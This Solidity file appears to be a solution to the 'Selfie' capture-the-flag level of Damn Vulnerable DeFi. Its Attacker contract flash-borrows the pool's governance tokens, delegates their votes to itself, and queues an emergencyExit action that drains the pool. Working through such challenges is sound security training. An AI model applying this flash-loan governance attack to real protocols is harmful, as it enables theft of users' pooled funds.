// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attacker {
    SelfiePool pool;
    IERC20 token;
    SimpleGovernance governance;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
    address recovery;
    address player;

    constructor(SelfiePool _pool, address _recovery, address _player) {
        pool = _pool;
        token = pool.token();
        governance = pool.governance();
        recovery = _recovery;
        player = _player;
    }

    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
        DamnValuableVotes(address(token)).delegate(address(this));
        governance.queueAction(address(pool), 0, abi.encodeCall(pool.emergencyExit, (recovery)));
        token.approve(msg.sender, amount);
        return CALLBACK_SUCCESS;
    }

    function borrow() external {
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), TOKENS_IN_POOL, "");
    }

}